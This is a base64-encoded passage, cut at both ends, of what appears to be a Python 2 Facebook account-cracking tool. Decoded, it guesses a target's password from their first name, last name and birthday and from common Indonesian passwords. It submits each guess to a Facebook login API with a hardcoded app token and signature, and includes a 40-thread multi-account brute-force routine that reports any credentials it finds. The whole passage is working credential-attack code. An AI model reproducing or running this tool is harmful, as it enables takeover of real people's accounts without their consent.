BNSU5JIEhGICMjIyMjCmRlZiBtaW5pKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdtW1wwMzNbMTs5MW1JTkZPXDAzM1sxOzk3bV0gXDAzM1sxOzkxbVRoZSB0YXJnZXQgYWNjb3VudCBtdXN0IGJlIGZyaWVuZHNcbiAgICAgICB3aXRoIHlvdXIgYWNjb3VudCBmaXJzdCEiCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXRyeToKCQlpZCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVGFyZ2V0IElEIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVdhaXQgYSBtaW51dGUgXDAzM1sxOzk3bS4uLicpCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZCsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSA6ICcrYVsnbmFtZSddCgkJbWtkaXIoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNoZWNrIFwwMzNbMTs5N20uLi4nKQoJCXRpbWUuc2xlZXAoMikKCQlta2RpcignXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtT3BlbiBwYXNzd29yZCBcMDMzWzE7OTdtLi4uJykKCQl0aW1lLnNsZWVwKDIpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHoxID0gYVsnZmlyc3RfbmFtZSddKycxMjMnCgkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6MSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJeSA9IGpzb24ubG9hZChkYXRhKQoJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoxCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCW1lbnVfaGFjaygpCgkJZWxzZToKCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoxCgkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJbWVudV9oYWNrKCkKCQkJZWxzZToKCQkJCXB6MiA9IGFbJ2ZpcnN0X25hbWUnXSArICcxMjM0NScKCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MgoJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJbWVudV9oYWNrKCkKCQkJCWVsc2U6CgkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6MgoJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQltZW51X2hhY2soKQoJCQkJCWVsc2U6CgkJCQkJCXB6MyA9IGFbJ2xhc3RfbmFtZSddICsgJzEyMycKCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6MykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCXkgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozCgkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJZWxzZToKCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozCgkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJZWxzZToKCQkJCQkJCQltb2RlID0gYVsnYmlydGhkYXknXQoJCQkJCQkJCXB6NCA9IG1vZGUucmVwbGFjZSgnLycsICcnKQoJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCXkgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NAoJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NAoJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQlsYWhpcnMgPSBhWydiaXJ0aGRheSddCgkJCQkJCQkJCQlqYXkgPSBsYWhpcnMucmVwbGFjZSgnLycsICcnKQoJCQkJCQkJCQkJcHo1ID0gYVsnZmlyc3RfbmFtZSddK2pheQoJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6NSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo1CgkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHo1CgkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJcHo2ID0gImJpbnRhbmcxMjMiCgkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgoJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgoJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJcHo3ID0gInNheWFuZzEyMywgc2F5YW5nLCBiaW50YW5nLCBiYWppbmdhbiwgc29tZW9uZSwgYW5qaW5nLCBwdWtpbWFrLCBwbGF5Ym95LCBkb3JhZW1vbiwgYmFoYWdpYSIKCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejcKCQkJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejYKCQkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gU29ycnksIGV4aXQgdG8gb3BlbiB0aGUgdGFyZ2V0IHBhc3N3b3JkIDooIgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gdHJ5IGl0IGFub3RoZXIgd2F5LiIKCQkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFRlcmdldCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2hhY2soKQoKCiMjIyMjIE11bHRpIEJydXRlIEZvcmNlICMjIyMjCiMjIyMjIENSQUNLICMjIyMKZGVmIGNyYWNrKCk6CglnbG9iYWwgaWRsaXN0LHBhc3N3LGZpbGUKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJaWRsaXN0ID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIElEICBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJykKCXBhc3N3ID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJykKCXRyeToKCQlmaWxlID0gb3BlbigoaWRsaXN0KSwgInIiKQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCWZvciB4IGluIHJhbmdlKDQwKToKCQkJcGljayA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNjcmFrLCBhcmdzPSgpKQoJCQlwaWNrLnN0YXJ0KCkKCQkJdGhyZWFkcy5hcHBlbmQocGljaykKCQlmb3IgcGljayBpbiB0aHJlYWRzOgoJCQlwaWNrLmpvaW4oKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfaGFjaygpCgpkZWYgc2NyYWsoKToKCWdsb2JhbCBzdWNlc3NmdWwsY2hlY2twb2ludCxhY3Rpb25fZmFpbGVkLGJhY2ssdXAKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcGVuX2l0ID0gb3BlbihpZGxpc3QsICJyIikKCQl1cCA9IG9wZW5faXQucmVhZCgpLnNwbGl0KCkKCQl3aGlsZSBmaWxlOgoJCQl1c2VybmFtZSA9IGZpbGUucmVhZGxpbmUoKS5zdHJpcCgpCgkJCXVybCA9ICJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcm5hbWUpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3N3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IgoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4odXJsKQoJCQltcHNoID0ganNvbi5sb2FkKGRhdGEpCgkJCWlmIGJhY2sgPT0gKGxlbih1cCkpOgoJCQkJYnJlYWsKCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKCQkJCW